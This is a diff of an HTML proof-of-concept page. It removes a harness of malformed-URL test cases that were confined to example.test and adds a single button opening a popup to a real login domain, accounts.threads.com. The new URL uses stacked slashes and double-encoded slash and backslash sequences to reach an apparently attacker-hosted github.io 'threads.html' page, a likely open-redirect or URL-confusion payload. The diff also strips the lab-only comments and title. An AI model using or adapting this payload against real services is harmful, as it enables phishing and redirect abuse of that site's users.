@@ -1,86 +1,18 @@
 
 <!DOCTYPE html>
 <html>
-<head>
-<title>URL Anomaly PoC</title>
-</head>
 <body>
-
-<h3>URL Anomaly Launcher</h3>
-
-<button onclick="myFunction(0)">Unicode Chaos</button>
-<button onclick="myFunction(1)">Encoding Chaos</button>
-<button onclick="myFunction(2)">Delimiter Chaos</button>
-<button onclick="myFunction(3)">Path Chaos</button>
-<button onclick="myFunction(4)">Long URL Chaos</button>
-<button onclick="myFunction(5)">Mixed Chaos</button>
-
-<pre id="output"></pre>
-
+<button onclick="myFunction()">open.test</button>
 <script>
-
-// Intentionally unusual URL construction test cases.
-// All destinations remain on example.test.
-
-var payloads = [
-
-  // Unicode whitespace and invisible characters
-  "https://example.test/%E2%80%8B%E3%80%80%E2%81%A0",
-
-  // Mixed and nested percent encoding
-  "https://example.test/%2525252F%252E%252E/%253Ftest",
-
-  // Repeated delimiters and unusual separators
-  "https://example.test/a/////b////c?x=1&&y=2",
-
-  // Unusual path normalization
-  "https://example.test/a/./b/../c/%2E%2E/d",
-
-  // Extremely long path
-  "https://example.test/" +
-  "a".repeat(500) +
-  "%252F%252E%252E/" +
-  "b".repeat(500),
-
-  // Hybrid encoding and Unicode
-  "https://example.test/" +
-  "%E2%80%8B%252F%255C%2540" +
-  "%E3%80%80%2525252E" +
-  "?x=%25252526#%25252523"
-
-];
-
-function myFunction(index) {
-
-  var url = payloads[index];
-
-  // Show raw and parsed representations.
-  document.getElementById("output").textContent =
-    "Selected test: " + index +
-    "\n\nRaw URL:\n" + url +
-    "\n\nParsed URL:\n" +
-    JSON.stringify(new URL(url), null, 2);
-
-  // Open only the controlled laboratory destination.
+function myFunction() {
   var x = window.open(
-    url,
+    "https://accounts.threads.com/a//b///c////d/%252f%255c/xnxrx.github.io/xnurx/threads.html",
     "_blank",
     "width=400,height=300"
   );
-
-  // Delayed observation.
-  setTimeout(function() {
-    console.log("Window reference:", x);
-    console.log("Test URL:", url);
-  }, 1850);
-
-  setTimeout(function() {
-    console.log("Test completed:", index);
-  }, 2400);
-
+  setTimeout(function(){x}, 1950);
+  setTimeout(function(){}, 2700);
 }
-
 </script>
-
 </body>
 </html>
